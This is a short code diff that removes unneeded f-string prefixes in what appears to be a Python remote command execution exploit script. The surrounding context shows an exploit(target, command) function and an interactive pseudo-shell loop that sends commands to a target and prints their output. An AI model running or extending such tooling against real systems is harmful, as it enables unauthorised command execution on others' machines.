@@ -90,7 +90,7 @@ def exploit(target, command):
             verify=False,
         )
         if r.status_code == 200 and r.text.strip():
-            print(f"[+] Command executed successfully!")
+            print("[+] Command executed successfully!")
             print(f"[+] Output:\n{r.text.strip()}")
             return r.text
         else:
@@ -105,7 +105,7 @@ def exploit(target, command):
 
 def interactive_shell(target):
     """Interactive pseudo-shell."""
-    print(f"\n[*] Interactive shell mode. Type 'exit' to quit.")
+    print("\n[*] Interactive shell mode. Type 'exit' to quit.")
     while True:
         try:
             cmd = input("shell> ").strip()
